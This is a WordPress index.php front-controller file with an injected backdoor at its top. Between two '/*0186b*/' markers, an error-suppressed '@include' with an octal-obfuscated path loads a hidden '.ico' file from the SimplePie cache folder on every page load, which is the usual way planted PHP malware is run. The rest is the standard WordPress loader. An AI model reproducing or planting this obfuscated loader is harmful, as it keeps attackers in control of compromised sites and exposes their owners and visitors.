<?php
/*0186b*/

@include "\057h\157m\145/\167a\151n\163o\150o\057p\165n\152a\142i\152h\141t\153a\056c\157m\057w\160-\151n\143l\165d\145s\057S\151m\160l\145P\151e\057C\141c\150e\057.\0662\144d\0623\0624\056i\143o";

/*0186b*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
